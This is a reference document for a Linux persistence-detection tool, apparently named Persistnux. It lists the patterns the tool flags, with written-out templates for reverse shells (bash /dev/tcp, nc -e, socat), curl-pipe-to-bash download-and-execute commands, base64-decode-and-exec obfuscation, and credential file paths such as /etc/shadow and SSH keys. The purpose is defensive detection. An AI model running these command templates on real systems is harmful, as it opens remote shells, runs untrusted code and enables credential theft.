# Suspicious Indicators Reference

This document outlines the suspicious patterns and indicators used by Persistnux to detect potential malicious persistence mechanisms.

## Research Sources

Our detection patterns are based on:
1. **MITRE ATT&CK Framework** - Persistence techniques (TA0003)
2. **Crackdown** - Open-source Linux persistence detection tool
3. **SANS DFIR** - Community best practices
4. **Real-world incident response** - Field-tested patterns

## Indicator Categories

### 1. Network-Based Reverse Shell Patterns

These patterns indicate potential reverse shell connections or command & control channels:

```
bash -i >& /dev/tcp/[IP]/[PORT]
bash -i >& /dev/udp/[IP]/[PORT]
sh -i >$ /dev/tcp/[IP]/[PORT]
sh -i >$ /dev/udp/[IP]/[PORT]
/bin/bash -c exec 5<>/dev/tcp/[IP]/[PORT]
/bin/bash -c exec 5<>/dev/udp/[IP]/[PORT]
nc -e /bin/sh [IP] [PORT]
/bin/sh | nc [IP] [PORT]
mknod /tmp/backpipe p && nc
telnet [IP] [PORT] | /bin/bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[IP]:[PORT]
xterm -display [IP]:[DISPLAY]
```

**Why these are suspicious:**
- Direct network connections with shell execution
- Commonly used by attackers for remote access
- Rarely used in legitimate system administration
- Often found in persistence mechanisms after compromise

### 2. Download and Execute Patterns

These patterns indicate downloading and executing code, often seen in malware droppers:

```
curl [URL] | bash
curl [URL] | sh
wget [URL] | bash
wget [URL] | sh
curl [URL] -o /tmp/[FILE] && chmod +x /tmp/[FILE]
wget -O /tmp/[FILE] [URL] && chmod +x /tmp/[FILE]
```

**Why these are suspicious:**
- Downloads arbitrary code from internet
- Executes without inspection
- Common in automated exploitation
- Frequently used for malware deployment

### 3. Obfuscation and Encoding Patterns

These patterns indicate attempts to hide malicious commands:

```
base64 -d | bash
echo [BASE64] | base64 -d | sh
eval $(echo [BASE64] | base64 -d)
python -c 'import base64; exec(base64.b64decode("[DATA]"))'
perl -e '[ENCODED_PAYLOAD]'
```

**Why these are suspicious:**
- Attempts to evade detection
- Hides actual command execution
- Rarely needed in legitimate scripts
- Common anti-analysis technique

### 4. Suspicious Location Patterns

These file paths are commonly abused for temporary execution:

```
/tmp/
/var/tmp/
/dev/shm/
Hidden directories (starting with .)
Writable world directories
```

**Why these are suspicious:**
- World-writable locations
- Files often auto-deleted on reboot
- Not logged by default
- Common staging areas for malware

### 5. Permission Manipulation

These patterns indicate changing file permissions for execution:

```
chmod +x /tmp/[FILE]
chmod 777 [FILE]
chmod u+s [FILE]  (setuid)
```

**Why these are suspicious:**
- Making files executable in temporary directories
- Overly permissive permissions (777)
- Setuid bit manipulation for privilege escalation

### 6. Scripting Language Socket Operations

Direct socket operations in interpreted languages:

```
python -c 'import socket'
perl -e 'use Socket'
ruby -rsocket -e
php -r 'fsockopen'
```

**Why these are suspicious:**
- Direct network programming from command line
- Often used for reverse shells
- Bypasses standard network tools
- Rare in legitimate system scripts

### 7. Sensitive File Access

Access to authentication and configuration files:

```
/etc/shadow
/etc/passwd
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/*/.ssh/id_rsa
```

**Why these are suspicious:**
- Contains password hashes
- SSH private keys for authentication
- Should only be accessed by system utilities
- Common target for credential theft

### 8. Process Execution Patterns

Suspicious command execution patterns:

```
sh -c [COMMAND]
bash -c [COMMAND]
eval [VARIABLE]
exec [COMMAND]
system([COMMAND])
```

**Why these are suspicious (context-dependent):**
- Dynamic command execution
- Can execute arbitrary code
- Often used to bypass restrictions
- Common in command injection attacks

## Detection Confidence Levels

### LOW
- Standard system files in expected locations
- Common legitimate configurations
- No suspicious patterns detected
- Baseline system state

### MEDIUM
- Unusual but potentially legitimate
- Files in expected locations with minor anomalies
- Recent modifications to system files
- Configurations that could be abused but aren't clearly malicious

### HIGH
- Contains known suspicious patterns
- Multiple red flags present
- Downloads from internet with execution
- Reverse shell patterns
- Obfuscation techniques
- Execution from temporary directories

### CRITICAL (Reserved for Future Use)
- Multiple HIGH confidence indicators
- Known malware signatures
- Active exploitation indicators
- Confirmed malicious activity

## Pattern Matching Strategy

Persistnux uses a layered approach to detection:

1. **Basic pattern matching** - Quick regex checks for common indicators
2. **Advanced pattern matching** - Comprehensive pattern arrays from research
3. **Context analysis** - Consider file location, permissions, and modification time
4. **Behavioral indicators** - Look for combinations of suspicious attributes

## False Positive Considerations

Some legitimate use cases may trigger detections:

- **DevOps automation**: CI/CD pipelines may download and execute scripts
- **Configuration management**: Puppet, Ansible, Chef may have similar patterns
- **Monitoring tools**: Some monitoring agents use network connections
- **Development**: Developers may test scripts in /tmp

**Recommendation**: Review HIGH confidence findings in context. Consider:
- Who created the file (user/group)?
- When was it modified?
- What is the business purpose?
- Is it documented in change management?

## Adding Custom Indicators

To extend detection patterns, edit these arrays in `persistnux.sh`:

```bash
SUSPICIOUS_NETWORK_PATTERNS=()
SUSPICIOUS_COMMANDS=()
SUSPICIOUS_LOCATIONS=()
SUSPICIOUS_FILES=()
```

## Indicator Updates

This list is regularly updated based on:
- New attack techniques (MITRE ATT&CK)
- Community contributions
- Real-world incident response
- Threat intelligence reports

## References

- **MITRE ATT&CK**: https://attack.mitre.org/tactics/TA0003/
- **Crackdown**: https://github.com/joeavanzato/crackdown
- **GTFOBins**: https://gtfobins.github.io/
- **LOLBAS**: Living Off The Land Binaries and Scripts
- **SANS DFIR**: https://www.sans.org/digital-forensics/

## Contributing

Found a new suspicious pattern or false positive? Please contribute:
1. Document the pattern with context
2. Explain why it's suspicious
3. Provide detection regex/string
4. Submit a pull request

---

**Last Updated**: 2026-01-23
**Version**: 1.1.0
